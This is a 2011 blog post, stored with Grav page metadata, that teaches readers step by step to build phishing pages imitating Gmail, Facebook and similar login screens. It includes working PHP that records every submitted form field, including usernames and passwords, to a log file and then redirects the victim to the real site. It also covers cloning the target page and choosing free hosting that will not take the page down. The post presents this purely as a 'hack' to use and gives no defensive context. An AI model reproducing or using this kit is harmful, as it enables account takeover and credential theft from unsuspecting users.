---
# http://learn.getgrav.org/content/headers
title: Creating a fake ( phishing ) page of gmail , facebook , orkut , myspace etc.
slug: creating-a-fake-phishing-page-of-gmail-facebook-orkut-myspace-etc
# menu: Creating a fake ( phishing ) page of gmail , facebook , orkut , myspace etc.
date: 16-01-2011
published: true
publish_date: 16-01-2011
# unpublish_date: 16-01-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - facebook
        - fake
        - hacking
        - internet
        - passwords
        - website
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [facebook,fake,hacking,internet,passwords,website]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

[![](http://static.howstuffworks.com/gif/phishing-1.jpg)](http://static.howstuffworks.com/gif/phishing-1.jpg)

Phishing has become a very easy to use trick to hack usernames and passwords of users. Here demonstrate how to create a fake phishing page for almost any social networking site , email or any other site that has a login form.

For this trick you would need a hosting account , you can get that easily.  
Register yourself at t35, host1free, 110mb etc.  
Note- 110mb checks for phishing page on their site and removes them.

So now u have a hosting account so lets create a fake page-

First go to the target site. In your browser select Save As from the File menu and save the site on  
 your hardisk with name “login.htm” .

or alternatively right click on the page and click “view source” and copy all of it and save them to a notepad file. Rename the file with “login.htm”.

Now the second part of the hack-  
Go to Notepad and copy this into it-

`<br></br><?php`

header ('Location: http://www.facebook.com');

$handle = fopen("log.txt", "a");

foreach($\_POST as $variable => $value) {

   fwrite($handle, $variable);

   fwrite($handle, "=");

   fwrite($handle, $value);

   fwrite($handle, "rn");

}

fwrite($handle, "rn");

fclose($handle);

exit;

?>

replace facebook.com with the URL you want the user to go after he clicks on submit button.

Save the page as fish.php



Now you need to edit the “login.htm” file we saves earlier. So go to that and open it with notepad.  
now search for anyhtin like “action=” which has something with login. And replace the URl with “fish.php”.

Also create a blank txt file with name “log.txt” . This file would be used to save your logins and passwords.  
Now you are done,.

Go to your hosting account and upload all the files to your server.  
Now go to the URL provided by ur host.

Like – http://g00glepage.t35.com/login.htm

And you would see the fake page as it is.  
Now enter the username and password.

Check the log.txt file. The password and username you enterd previously would be saved in the log.txt  file.

Here you have a working phishing page.  
bu [hackiteasy](http://www.hackiteasy.com/)

Go to our new site- shankee.com
